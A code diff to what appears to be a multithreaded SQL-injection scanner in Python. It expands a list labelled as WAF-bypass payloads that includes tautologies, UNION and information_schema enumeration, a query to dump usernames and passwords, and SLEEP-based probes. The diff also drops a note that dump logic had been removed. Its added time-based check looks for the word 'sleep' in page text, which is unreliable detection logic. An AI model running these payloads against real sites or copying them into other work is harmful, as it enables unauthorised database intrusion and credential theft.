@@ -24,21 +24,14 @@ logger.addHandler(handler)
 found_vulnerabilities = []
 lock = threading.Lock()
 payloads = []
-waf_bypass_payloads = ['/*', ' OR 1=1--', ' AND 1=1--', '%20OR%201%3D1%20--']
-threads = []
-
-# SQL injection payloads
-payloads += [
-    "' OR 1=1 --",  # Basic SQLi payload
-    "' OR 'a'='a",  # Another simple SQL injection
-    "' UNION SELECT NULL,NULL,NULL --",  # Union based injection
-    "' AND 1=2 --",  # False condition (error-based)
-    "' OR 1=1 LIMIT 1 --",  # Limits
-    "' AND SLEEP(5) --",  # Time-based injection
-    "' OR 1=1 --",  # Common injection
-    "'; SELECT table_name FROM information_schema.tables --",  # Tables enumeration
-    "'; SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --",  # Columns enumeration
-    "'; SELECT username, password FROM users --",  # Attempt to dump credentials (example)
+waf_bypass_payloads = [
+    '/*', ' OR 1=1--', ' AND 1=1--', '%20OR%201%3D1%20--',  # Simple bypass
+    '" OR "a"="a', "' OR '1'='1' --", "admin' --", "admin' #",  # Obfuscated payloads
+    ' OR 1=1 LIMIT 1 --', ' AND 1=1 --', " UNION SELECT NULL, NULL, NULL --",
+    "'; SELECT table_name FROM information_schema.tables --",  # SQL Enumeration payloads
+    "'; SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --",  # Columns enum
+    "'; SELECT username, password FROM users --",  # Attempt to dump credentials
+    "' AND SLEEP(5) --",  # Time-based SQLi
 ]
 
 # Headers to make requests seem normal
@@ -85,8 +78,12 @@ def test_sql_injection(url, method, form_data):
                 with lock:
                     found_vulnerabilities.append((url, payload, "MySQL-based SQL Injection"))
                     logger.info(f"MySQL-based SQL Injection found at {url} with payload {payload}")
-            elif 'username' in response.text and 'password' in response.text:  # Potential credentials dump (removed dump logic)
+            elif 'username' in response.text and 'password' in response.text:  # Potential credentials dump
                 logger.info(f"Potential credentials found at {url} with payload {payload}")
+            elif "sleep" in response.text.lower():  # Time-based SQLi detection
+                with lock:
+                    found_vulnerabilities.append((url, payload, "Time-based SQL Injection"))
+                    logger.info(f"Time-based SQL Injection found at {url} with payload {payload}")
 
         except RequestException as e:
             logger.error(f"Error testing {url}: {str(e)}")
